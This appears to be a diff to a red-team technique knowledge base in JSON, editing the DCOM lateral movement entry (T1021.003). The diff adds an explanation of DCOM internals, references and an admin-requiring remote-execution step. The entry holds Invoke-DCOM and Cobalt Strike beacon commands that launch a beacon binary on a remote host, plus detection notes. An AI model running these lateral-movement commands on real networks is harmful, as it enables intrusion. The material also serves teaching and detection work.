@@ -1982,17 +1982,43 @@
         "phase": "07. Lateral Movement",
         "ttp": "T1021.003",
         "external": false,
-        "description": "NoDescription",
+        "description": "DCOM is an extension of COM (Component Object Model), which allows applications to instantiate and access the properties and methods of COM objects on a remote computer just like objects on the local machine using the DCERPC-based DCOM protocol. Information about the identity, the implementation and the configuration of every COM (and DCOM) object is stored in the registry, and associated with a few important identifiers:\n- CLSID - The Class Identifier is a GUID, which acts as a unique identifier for a COM class, and every class registered in Windows is associated with a CLSID (COM objects may be used without registration, but that is beyond the scope of this article). The CLSID key in the registry points to the implementation of the class, using the InProcServer32 subkey in case of a dll-based object, and the LocalServer32 key in case of an exe.\n- ProgID - The Programmatic Identifier is an optional identifier, which can be used as a more user-friendly alternative to a CLSID, as it does not have to adhere to the intimidating GUID format of CLSIDs (\"System.AppDomainManager\", for example, is much easier on the eyes than a GUID). ProgIDs are not guaranteed to be unique, and unlike CLSID, not every class is associated with a ProgID.\n- AppID  - The Application Identifier is used to specify the configuration of one or more COM objects associated with the same executable. This includes the permissions given to various groups to instantiate and access the associated classes, both locally and remotely.\n\nThe instantiation of a remote DCOM object behaves as follows:\n1. The client machine requests an instantiation of an object denoted by a CLSID from a remote machine. If the client uses a ProgID, it is first resolved locally to a CLSID.\n2. The remote machine checks if there is an AppID associated with the CLSID in question, and verifies the permissions of the client.\n3. If all goes well, the DCOMLaunch service creates an instance of the requested class, most commonly by running the executable of the LocalServer32 subkey, or by creating a DllHost process to host a dll referenced by the InProcServer32 subkey.\n4. Communication is established between the client application and the server process. In most cases, the new process is created in the session associated with the DCOM communication.\n5. The client can then access the members and methods of the newly created object.",
         "content": "# DCOM\n\n## Cobalt Strike\n-\n\n# Tools\n########\n########",
         "category": "",
         "stealthy": false,
         "changes": [
-            "\n## [[Invoke-DCOM]]\n```\nImport-Module .\\Invoke-DCOM.ps1\nInvoke-DCOM -ComputerName '192.168.2.100' -Method MMC20.Application -Command \"calc.exe\"\nInvoke-DCOM -ComputerName '192.168.2.100' -Method ExcelDDE -Command \"calc.exe\"\nInvoke-DCOM -ComputerName '192.168.2.100' -Method ServiceStart \"MyService\"\n```\n\nTo interact over Distributed Component Object Model (DCOM), we must use an external tool such as [[Invoke-DCOM]].\n``````beacon\nbeacon> powershell-import C:\\Tools\\Invoke-DCOM.ps1\nbeacon> powershell Invoke-DCOM -ComputerName srv1 -Method MMC20.Application -Command C:\\Windows\\beacon-smb.exe\nCompleted\n\nbeacon> link srv1\n[+] established link to child beacon: 10.10.1.20\n``````\n\nDCOM is more complicated to detect, since each \"Method\" works in a different way. In the particular case of `MMC20.Application`, the spawned process will be a child of `mmc.exe`.\n\n``````\nProcessId: 952\nImage: C:\\Windows\\beacon-smb.exe\nParentImage: C:\\Windows\\System32\\mmc.exe\n``````  \nProcesses started via DCOM may also be seen where the parent is `svchost.exe` (started with the command line `-k DcomLaunch`)."
+            "\n## [[Invoke-DCOM]]\n'''\nImport-Module .\\Invoke-DCOM.ps1\nInvoke-DCOM -ComputerName '192.168.2.100' -Method MMC20.Application -Command \"calc.exe\"\nInvoke-DCOM -ComputerName '192.168.2.100' -Method ExcelDDE -Command \"calc.exe\"\nInvoke-DCOM -ComputerName '192.168.2.100' -Method ServiceStart \"MyService\"\n'''\n\nTo interact over Distributed Component Object Model (DCOM), we must use an external tool such as [[Invoke-DCOM]].\n''''''beacon\nbeacon> powershell-import C:\\Tools\\Invoke-DCOM.ps1\nbeacon> powershell Invoke-DCOM -ComputerName srv1 -Method MMC20.Application -Command C:\\Windows\\beacon-smb.exe\nCompleted\n\nbeacon> link srv1\n[+] established link to child beacon: 10.10.1.20\n''''''\n\nDCOM is more complicated to detect, since each \"Method\" works in a different way. In the particular case of 'MMC20.Application', the spawned process will be a child of 'mmc.exe'.\n\n''''''\nProcessId: 952\nImage: C:\\Windows\\beacon-smb.exe\nParentImage: C:\\Windows\\System32\\mmc.exe\n''''''  \nProcesses started via DCOM may also be seen where the parent is 'svchost.exe' (started with the command line '-k DcomLaunch')."
         ],
         "tools": [
             "Invoke-DCOM"
         ],
-        "steps": []
+        "references": [
+            "https://www.cybereason.com/blog/dcom-lateral-movement-techniques",
+            "https://www.winccoa.com/documentation/WinCCOA/3.18/en_US/Treiber_OPC/opc_c_dcom.html"
+        ],
+        "steps": [
+            {
+                "id": "5a71f508-42a9-403a-9dbc-250a1a866b00",
+                "name": "Get RCE via DCOM",
+                "description": "",
+                "requirements": {
+                    "and": [
+                        {
+                            "tag": "SERVICE:DCOM"
+                        },
+                        {
+                            "tag": "SERVICE:RPC"
+                        },
+                        {
+                            "tag": "PRIVS:ADMIN"
+                        }
+                    ]
+                },
+                "results": [
+                    "EXECUTION:REMOTE"
+                ]
+            }
+        ]
     },
     {
         "id": "4c850e26-3460-4906-8e6f-612240140274",
